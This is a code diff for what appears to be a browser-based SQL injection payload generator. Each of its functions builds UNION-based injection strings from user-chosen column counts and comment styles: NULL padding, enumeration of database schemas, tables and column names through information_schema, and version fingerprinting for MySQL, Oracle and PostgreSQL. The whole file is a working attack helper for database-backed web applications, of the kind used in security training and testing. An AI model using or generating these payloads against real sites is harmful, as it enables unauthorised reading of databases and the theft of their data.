@@ -79,54 +79,103 @@ function generateUnionOrderBy() {
 
 
 function generateUnionSelectNull() {
-    var numNulls = document.getElementById('Num-Nulls').value.trim();
+    var numNulls = parseInt(document.getElementById('Num-Nulls').value.trim(), 10); // Convert to integer
+    var commentType = document.getElementById('comment-options-2').value; // Assuming you have this select element in your HTML
 
-    if (numNulls === '') {
-        alert('Please enter the number of NULLs.');
+    if (isNaN(numNulls) || numNulls < 1) { // Check if numNulls is a number and greater than 0
+        alert('Please enter a valid number of NULLs.');
         return;
     }
 
-    var unionQuery = "1' UNION SELECT " + "NULL, ".repeat(numNulls - 1) + "NULL--";
+    // Adjust how the comment type is appended
+    var nullParts = new Array(numNulls).fill('NULL').join(', '); // More efficient way to handle repetition
+    var unionQuery = `1' UNION SELECT ${nullParts} ${commentType}`; // Use template literal for clarity
     document.getElementById('Union-Query-2').value = unionQuery;
 
     // Show the explanation
     document.querySelector('.explanation').style.display = 'block';
 }
 
+function generateUnionDumpInformationSchema() {
+    var totalColumns = parseInt(document.getElementById('Total-Columns-Schema').value, 10);
+    var schemaColumn = parseInt(document.getElementById('Schema-Column').value, 10);
+    var commentOption = document.getElementById('comment-options-3').value;
 
-function generateUnionInfoSchemaTable() {
-    var tableName = document.getElementById('TableName').value.trim();
-    var commentOption = document.getElementById('comment-options-4').value;
-
-    if (tableName === '') {
-        alert('Please enter the table name.');
+    // Validate that the schema column is within the total number of columns
+    if (schemaColumn > totalColumns) {
+        alert('The Schema Name Column must be within the total number of columns.');
         return;
     }
 
-    var unionQuery = "1' UNION SELECT * FROM information_schema.tables WHERE table_name = '" + tableName + "'" + commentOption;
-    document.getElementById('Union-Query-5').value = unionQuery;
+    // Build the query
+    let columns = Array.from({ length: totalColumns }, (_, i) => i + 1 === schemaColumn ? 'schema_name' : 'NULL').join(', ');
+    var unionQuery = `1' UNION SELECT ${columns} FROM information_schema.schemata ${commentOption}`;
+    document.getElementById('Union-Query-4').value = unionQuery;
 
     // Show the explanation
+    document.querySelector('.explanation').style.display = 'block';
+}
+
+
+
+function generateUnionInfoSchemaTable() {
+    var totalColumns = parseInt(document.getElementById('Total-Columns-Table').value, 10);
+    var tableColumn = parseInt(document.getElementById('Table-Column').value, 10);
+    var commentOption = document.getElementById('comment-options-5').value;
+
+    if (isNaN(totalColumns) || totalColumns < 1) {
+        alert('Please enter a valid total number of columns.');
+        return;
+    }
+
+    if (isNaN(tableColumn) || tableColumn < 1 || tableColumn > totalColumns) {
+        alert('The Table Name Column must be a valid column within the total number of columns.');
+        return;
+    }
+
+    // Initialize an array with 'NULL's
+    let columns = new Array(totalColumns).fill('NULL');
+    // Replace the specified column with 'table_name', adjusting for zero-based index
+    columns[tableColumn - 1] = 'table_name';
+    var unionQuery = `1' UNION SELECT ${columns.join(', ')} FROM information_schema.tables ${commentOption}`;
+    document.getElementById('Union-Query-5').value = unionQuery;
+
     document.querySelector('.explanation').style.display = 'block';
 }
 
 
 
 function generateUnionInfoSchemaColumn() {
-    var tableName = document.getElementById('TableName').value.trim();
-    var commentOption = document.getElementById('comment-options-5').value;
+    var totalColumns = parseInt(document.getElementById('Total-Columns').value, 10);
+    var columnNamePosition = parseInt(document.getElementById('Column-Name-Position').value, 10);
+    var tableName = document.getElementById('UserTableName').value.trim();
+    var commentOption = document.getElementById('comment-options-6').value;
 
+    // Validation
+    if (isNaN(totalColumns) || totalColumns < 1) {
+        alert('Please enter a valid total number of columns.');
+        return;
+    }
+    if (isNaN(columnNamePosition) || columnNamePosition < 1 || columnNamePosition > totalColumns) {
+        alert('Column Name Position must be within the total number of columns.');
+        return;
+    }
     if (tableName === '') {
         alert('Please enter the table name.');
         return;
     }
 
-    var unionQuery = "1' UNION SELECT column_name FROM information_schema.columns WHERE table_name = '" + tableName + "'--" + commentOption;
+    // Generate the columns part
+    let columns = Array.from({ length: totalColumns }, (_, i) => i + 1 === columnNamePosition ? 'column_name' : 'NULL').join(', ');
+
+    // Construct the query
+    var unionQuery = `1' UNION SELECT ${columns} FROM information_schema.columns WHERE table_name = '${tableName}' ${commentOption}`;
     document.getElementById('Union-Query-6').value = unionQuery;
 
     // Show the explanation
     document.querySelector('.explanation').style.display = 'block';
 }
+
 
 
 
@@ -213,27 +262,88 @@ function generateUnionDump4() {
 }
 
 
-function generateVersionQuery1() {
+function generateVersionQueryMySQL() {
+    var totalColumns = parseInt(document.getElementById('Total-Columns-Version-MySQL').value, 10);
+    var versionColumnPosition = parseInt(document.getElementById('Version-Column-Position-MySQL').value, 10);
     var commentType = document.getElementById('comment-options-11').value;
-    var versionQuery = "' UNION SELECT @@version" + commentType;
+
+    if (isNaN(totalColumns) || totalColumns < 1) {
+        alert('Please enter a valid number of columns.');
+        return;
+    }
+
+    if (isNaN(versionColumnPosition) || versionColumnPosition < 1 || versionColumnPosition > totalColumns) {
+        alert('Version Column Position must be a valid column within the total number of columns.');
+        return;
+    }
+
+    // Build the columns part of the query
+    let columns = Array.from({ length: totalColumns }, (_, i) => i + 1 === versionColumnPosition ? '@@version' : 'NULL').join(', ');
+
+    // Construct the query
+    var versionQuery = `' UNION SELECT ${columns} FROM information_schema.tables ${commentType}`;
     document.getElementById('Union-Query-11').value = versionQuery;
-}
-
-function generateVersionQuery2() {
-    var commentType = document.getElementById('comment-options-12').value;
-    var versionQuery = "' UNION SELECT * FROM v$version" + commentType;
-    document.getElementById('Union-Query-12').value = versionQuery;
-}
-
-
-function generateVersionQuery3() {
-    var commentOption = document.getElementById('comment-options-13').value.trim();
-    var unionQuery = "' UNION SELECT * FROM version()" + commentOption;
-    document.getElementById('Union-Query-13').value = unionQuery;
 
     // Show the explanation
     document.querySelector('.explanation').style.display = 'block';
 }
+
+
+
+function generateVersionOracleDB() {
+    var totalColumns = parseInt(document.getElementById('Total-Columns-Version-Oracle').value, 10);
+    var versionColumnPosition = parseInt(document.getElementById('Version-Column-Position-Oracle').value, 10);
+    var commentType = document.getElementById('comment-options-12').value;
+
+    if (isNaN(totalColumns) || totalColumns < 1) {
+        alert('Please enter a valid number of columns.');
+        return;
+    }
+
+    if (isNaN(versionColumnPosition) || versionColumnPosition < 1 || versionColumnPosition > totalColumns) {
+        alert('Version Column Position must be a valid column within the total number of columns.');
+        return;
+    }
+
+    // Build the columns part of the query
+    let columns = Array.from({ length: totalColumns }, (_, i) => i + 1 === versionColumnPosition ? 'v$version' : 'NULL').join(', ');
+
+    // Construct the query
+    var versionQuery = `' UNION SELECT ${columns} FROM v$version ${commentType}`;
+    document.getElementById('Union-Query-12').value = versionQuery;
+
+    // Show the explanation
+    document.querySelector('.explanation').style.display = 'block';
+}
+
+
+
+function generateVersionQueryPGSQL() {
+    var totalColumns = parseInt(document.getElementById('Total-Columns-Version-PGSQL').value, 10);
+    var versionColumnPosition = parseInt(document.getElementById('Version-Column-Position-PGSQL').value, 10);
+    var commentOption = document.getElementById('comment-options-13').value;
+
+    if (isNaN(totalColumns) || totalColumns < 1) {
+        alert('Please enter a valid number of columns.');
+        return;
+    }
+
+    if (isNaN(versionColumnPosition) || versionColumnPosition < 1 || versionColumnPosition > totalColumns) {
+        alert('Version Column Position must be a valid column within the total number of columns.');
+        return;
+    }
+
+    // Build the columns part of the query
+    let columns = Array.from({ length: totalColumns }, (_, i) => i + 1 === versionColumnPosition ? 'version()' : 'NULL').join(', ');
+
+    // Construct the query
+    var versionQuery = `' UNION SELECT ${columns} ${commentOption}`;
+    document.getElementById('Union-Query-13').value = versionQuery;
+
+    // Show the explanation
+    document.querySelector('.explanation').style.display = 'block';
+}
+
 
 
 
